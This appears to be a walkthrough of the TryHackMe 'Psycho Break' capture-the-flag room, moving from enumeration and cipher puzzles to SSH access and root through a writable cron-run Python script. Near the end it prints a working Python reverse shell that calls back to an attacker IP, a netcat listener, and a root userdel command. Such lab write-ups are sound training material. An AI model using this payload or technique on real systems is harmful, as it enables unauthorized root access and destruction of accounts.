# TryHackMe - Psycho Break 

## 🧾 Room Overview
**Psycho Break** is a TryHackMe CTF-style vulnerable machine where the objective is to perform enumeration, gain user access, and escalate privileges to root. This box teaches valuable lessons about insecure scripts, weak service configurations, and abuse of cron jobs.

---

## 🎯 Objective
- Enumerate the target system
- Gain initial foothold as user `kidman`
- Escalate privileges to root
- Capture both user and root flags

---

## 🛠️ Tools Used

- [`Kali Linux`](https://www.kali.org/) – primary operating system for penetration testing
- [`nmap`](https://nmap.org/) – port scanning and service detection
- [`gobuster`](https://github.com/OJ/gobuster) – directory brute-forcing
- [`hydra`](https://github.com/vanhauser-thc/thc-hydra) – brute force login credentials
- [`python`](https://www.python.org/) – reverse shell payload scripting
- `netcat` – catch reverse shell
- 🔐 **Online Cipher Decoders** – used for decoding substitution/multi-tap ciphers (e.g., Atbash, Morse)


## 🧵 Summary of the Box

1. **Enumeration** revealed open ports and a web server with hidden directories.
2. Using **gobuster**, a login page was found. Default or guessed credentials allowed access.
3. A suspicious file `/var/.the_eye_of_ruvik.py` was found owned by root but **writable by the user**.
4. The script was automatically executed via a **cron job running as root** every 2 minutes.
5. Injected a **Python reverse shell payload** into the script, which successfully spawned a **root shell**.
6. Collected both user and root flags.

---

## 📚 Key Learning Points

- 🛠️ **Writable files owned by root** that are executed regularly can be abused for **privilege escalation**.
- ⚙️ **Cron jobs** can become a critical weakness when they run insecure or user-editable scripts.
- 🐚 Using a **reverse shell in Python** can be an effective technique to maintain access.
- 🔒 Always validate permissions of scripts run as privileged users.

---

## 📌 Flags Captured
- ✅ `user.txt`
- ✅ `root.txt`

---

> 🧠 *"No one shall hide from Ruvik..."* — This box shows exactly why **script security and proper permission management** are critical in any Linux system.

## 🔍 2. Reconnaissance

### 🔎 Nmap Scan

Performed an Nmap scan to identify open ports, running services, and service versions using the following command:
```bash
nmap -sT -Pn 10.10.239.199
```
<img width="966" height="337" alt="image" src="https://github.com/user-attachments/assets/df6a03de-d720-4e78-89f4-36d25a750dfe" />

### 🔓 Accessing the HTTP Service  
<img width="1919" height="872" alt="image" src="https://github.com/user-attachments/assets/37725330-14f7-44d5-bedf-cfca432d685d" />

check the view source page to find anything is hidden there
<img width="1466" height="722" alt="image" src="https://github.com/user-attachments/assets/8dc7ca87-e7b1-4844-9fe4-bbb4cf2ce02d" />

### 🧩 Discovered Hidden Directory: /sadistroom  
We found a hint in the HTML comments pointing to `/sadistroom`, which appears to be a hidden directory. Navigating to this path to explore further content or potential entry points.
<img width="1777" height="800" alt="image" src="https://github.com/user-attachments/assets/dad085b7-af23-453f-a71f-bad15df8c281" />

### 🔐 Access Key Found for Locker Room  
We have obtained the key `532219a04ab7a02b56faafbec1a4c1ea`, which appears to access to the locker room or a protected resource. This key will be used to proceed further in the challenge.
<img width="1814" height="858" alt="image" src="https://github.com/user-attachments/assets/4a64b129-bd21-4380-b04f-ce40e4024666" />

open the Locker using the key
<img width="1653" height="946" alt="image" src="https://github.com/user-attachments/assets/5b6a1ed2-80e0-4142-a2ef-9ac618b5e2a2" />

### 🧩 Decoding the Cipher
The cipher `"Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv"` was encoded using the **Atbash cipher**.
<img width="1557" height="963" alt="image" src="https://github.com/user-attachments/assets/6bc5ed1f-9ef9-4844-b622-5b7bd74119a0" />

### 🗺️ Map Access Credential
The string `Grant_me_access_to_the_map_please` serves as a key or parameter to unlock the **map page** in the challenge. Use it to gain further access.
Inside the map page there are two more pages to access
<img width="1658" height="889" alt="image" src="https://github.com/user-attachments/assets/6bdb2cbd-a17e-4c4f-92f2-d565afd1fe2f" />
<img width="1537" height="787" alt="image" src="https://github.com/user-attachments/assets/616197d0-335b-48a1-afce-a64a2fd7b9ea" />

### 🔍 Exploring the SafeHeaven Page  
After accessing the **SafeHeaven** page, further investigation is required. Use **directory enumeration tools** like `gobuster` 
or `dirb` to discover hidden directories that might reveal crucial information or further entry points.
<img width="1383" height="402" alt="image" src="https://github.com/user-attachments/assets/60d68027-c9c8-4adf-9837-8c0eb48456bc" />
<img width="1444" height="215" alt="image" src="https://github.com/user-attachments/assets/d5bac822-6488-4017-b567-06cba3b7ea2c" />

Using the results from the `gobuster` search, access the discovered `/keeper` directory to continue exploring potential clues or credentials.
<img width="1361" height="824" alt="image" src="https://github.com/user-attachments/assets/6349af63-ed26-4cf1-ac5f-32bd2b76d9e7" />

click the button 
<img width="1659" height="795" alt="image" src="https://github.com/user-attachments/assets/7c6c8cf9-5f5d-43aa-babc-c51b9a001d90" />

### 🔍 Reverse Image Search  
Perform a reverse image search on Google using the provided image to identify the **location or context** associated with it, which may be useful for solving further tasks.

<img width="610" height="1356" alt="image" src="https://github.com/user-attachments/assets/6f35f3e6-550c-46a7-9353-b5deac873a42" />

The image points to the **St. Augustine Lighthouse**. Solve the related challenge or puzzle here to retrieve the **keeper key**, which is essential for progressing further in the room.
<img width="1535" height="616" alt="image" src="https://github.com/user-attachments/assets/d8b65e16-4993-44aa-8b47-87c49c143500" />

### 🏚️ Accessing the Abandoned Room  
Navigate to the `/abandonedRoom` path identified on the map.  
Use the **keeper key** `48ee41458eb0b43bf82b986cecf3af01` to unlock access to this restricted area.

<img width="1090" height="696" alt="image" src="https://github.com/user-attachments/assets/2354ac0e-eb96-4daa-9252-37c4df16fbf9" />

### 🕷️ Escape from the Spiderlady  
The upcoming challenge requires quick thinking — you must escape from the **Spiderlady** within **2 minutes**.  
Investigate the environment and discover the method or vulnerability that allows you to evade her grasp.

<img width="1352" height="661" alt="image" src="https://github.com/user-attachments/assets/eaf4d8fd-1dc4-4f4f-9bd7-694a9546baf0" />
<img width="1238" height="786" alt="image" src="https://github.com/user-attachments/assets/51b9d043-20f9-4d11-8f9a-48bd6723ccbb" />

### 🧩 Clue from CSS: `pkill`  
After thorough research, a subtle hint was discovered in the CSS file name: **`pkill`**, which is a Linux command.  
This led to the idea of attempting **shell command execution via the URL** for privilege escalation or exploitation.

<img width="1419" height="895" alt="image" src="https://github.com/user-attachments/assets/ea0f6a4c-612c-4249-b643-924f1c49c8c1" />

### 📁 Discovered a New Directory  
While exploring the target, we successfully **identified a new directory**, which may contain important files or lead to the next stage of the challenge.
<img width="1243" height="706" alt="image" src="https://github.com/user-attachments/assets/83751543-e952-4f3a-b4c4-dc07508101b1" />

Download the provided `.zip` file and extract its contents to analyze any hidden files, credentials, or further clues.
<img width="789" height="636" alt="image" src="https://github.com/user-attachments/assets/e9d6287a-d4de-41bc-8b6c-dfe2913aafa2" />

there is a text file and an image
<img width="951" height="412" alt="image" src="https://github.com/user-attachments/assets/adbbbb5d-671b-4e82-9826-194219056fc1" />

The extracted image file fails to open, which suggests it may be mislabeled. Use an online file signature checker or the `file` command in Linux to verify the file’s true format.
<img width="1282" height="855" alt="image" src="https://github.com/user-attachments/assets/67fc2af9-40d5-4fb0-a8b2-2ff467b009f8" />

Upon inspection, the image file appears to actually be a zip archive. Rename the file with a `.zip` extension and extract it to reveal hidden contents.
<img width="795" height="419" alt="image" src="https://github.com/user-attachments/assets/98162121-eddf-434d-bd25-0c00c052b9e9" />

After extracting the disguised zip file, we obtained two files: a `.wav` audio file likely containing a key, and an image. These files may hold clues for further progress or access credentials.
<img width="699" height="351" alt="image" src="https://github.com/user-attachments/assets/f1d5c17d-c3fb-41fd-a0e9-200363b980a3" />

The `.wav` file likely contains a hidden Morse code signal. Use any online Morse decoder tool to upload the file and retrieve the encoded message
<img width="1386" height="863" alt="image" src="https://github.com/user-attachments/assets/5a638777-beea-41aa-b273-510e8c891cb0" />

The extracted Morse code revealed the key `SHOWME`. This could potentially be used as a passphrase for steganography-based extraction from the image file.
<img width="966" height="152" alt="image" src="https://github.com/user-attachments/assets/163e4639-22fd-4893-9c7c-6e3454755556" />

open the thankyou.txt
<img width="1382" height="664" alt="image" src="https://github.com/user-attachments/assets/9089a65c-5e60-422a-85d1-ff2b5edd3297" />

### 🔐 FTP Credentials Acquired  
We have obtained the **username and password** for the FTP service. Use these to connect and explore the contents.

### 📥 Access and Download Files  
Login to the FTP service using the credentials, list the directory contents, and download the two available files for further analysis.

<img width="1696" height="532" alt="image" src="https://github.com/user-attachments/assets/c2d13233-a541-47cc-afda-067d39989524" />
<img width="765" height="513" alt="image" src="https://github.com/user-attachments/assets/4b23d9ba-1c56-44df-898d-f6c8873617ce" />
🧠 Brute-Forcing the Program with a Dictionary

We have two files:

- A binary/program: `program`
- A dictionary file: `random.dic`

The `program` file expects a single parameter to run. This implies that we need to **brute-force** the program using each word in the dictionary.

---

### 🐍 Custom Python Script for Brute Force

I wrote a simple Python script to automate this:

```python
import subprocess

for word in open("random.dic"):
    word = word.strip()
    subprocess.run(["./program", word])
```
<img width="891" height="98" alt="image" src="https://github.com/user-attachments/assets/92ab96dd-85b7-465a-a737-79a062fd0b0d" />
### 🔢 Decode Using Multi-Tap Mobile Keyboard
Now we have a name and a value to decode. After some research, I discovered this code resembles the **multi-tap mobile keypad encoding** used in old phones. Each number corresponds to a set of letters, and the count of presses determines the specific character.

<img width="1600" height="1067" alt="image" src="https://github.com/user-attachments/assets/77188203-9655-4229-93c8-2c23673300ee" />
### 🔐 SSH Login Using Decoded Credentials

After decoding the multi-tap text, we get the value:  
`KIDMAN'S PASSWORD IS SOSTRANGE`

Now, try logging into the SSH service using the username `kidman` and the password `KIDMANSPASSWORDISSOSTRANG`.

<img width="874" height="339" alt="image" src="https://github.com/user-attachments/assets/5f3fe768-54b5-44b6-a9fc-37c64f49e547" />
### ⬆️ Privilege Escalation After SSH Access
list all the files first
<img width="682" height="68" alt="image" src="https://github.com/user-attachments/assets/14630352-4b19-4e62-a812-aace595cdef1" />
<img width="943" height="404" alt="image" src="https://github.com/user-attachments/assets/9ac4e58f-bb35-4ee1-842e-dbc0ffe295bc" />
### ⏰ Crontab Vulnerability Identified
While inspecting the system post-SSH access, a vulnerable cron job was discovered.
 
<img width="934" height="441" alt="image" src="https://github.com/user-attachments/assets/a782d168-8a3d-4756-951f-25a72cacf569" />
### 🕓 What is a Crontab?

A **crontab** (cron table) is used to schedule automated tasks in Linux. The `cron` service reads the crontab files and executes commands at specified intervals.

In this scenario, the file `/var/.the_eye_of_ruvik.py` is being executed **every 2 minutes** by a **cron job running with root privileges**.

#### 🔐 File Permission Check

Run the following command to verify the file’s permissions:

```bash
ls -l /var/.the_eye_of_ruvik.py
```
<img width="671" height="40" alt="image" src="https://github.com/user-attachments/assets/7f045f9a-7186-4732-84cc-67df74d4ed9e" />
### 🚨 Exploit: Writable Root-Cron Script

Since we have **read and write access** to the file `/var/.the_eye_of_ruvik.py`, and it's executed by root every 2 minutes, we can exploit it by inserting a **Python reverse shell payload**.

### 🐍 Python Reverse Shell Payload

Replace the contents of the file with the following code:

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.17.15.160", 4242))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```
### 📞 Open a Netcat Listener
```bash
nc -lvnp 4242
```
### 🏁 Root Access Achieved
After catching the reverse shell, we now have **root access**. Proceed to retrieve the final flag and clean up the system:
### 📂 Access Root Directory & Read Flag
Navigate to the root directory and read the root flag:
```bash
cd /root
cat root.txt
userdel -r ruvik
```
<img width="927" height="435" alt="image" src="https://github.com/user-attachments/assets/56e9a3eb-7a5f-4442-80b4-aca0c5f0b07a" />
✅ With this, we've completed all objectives and cleaned up the system. Challenge successfully pwned!
<img width="1695" height="718" alt="image" src="https://github.com/user-attachments/assets/25a7f405-236e-4e37-aff0-0f45a275cc18" />

## 🧠 Conclusion: TryHackMe - Psycho Break

The **Psycho Break** room was a deeply immersive and multi-layered CTF challenge that tested both fundamental and advanced cybersecurity skills. From initial reconnaissance and enumeration to exploiting web directories, decoding steganographic clues, and leveraging `cron` misconfigurations for privilege escalation — this room had it all.

We explored hidden paths, brute-forced services, decoded classic ciphers like Atbash and Multi-tap, and crafted reverse shells to gain root access. The final escalation using a writable cron-executed Python script was a powerful reminder of how small misconfigurations can lead to full system compromise.

### 💡 Key Takeaways
- Importance of directory and service enumeration.
- Practical use of brute-force and decoding techniques.
- Recognizing and exploiting cron-based privilege escalation.
- Combining multiple disciplines: steganography, audio forensics, classic ciphers, and shell exploitation.

> This room is highly recommended for learners who want to level up their enumeration and post-exploitation skills in a realistic, story-driven environment.
---


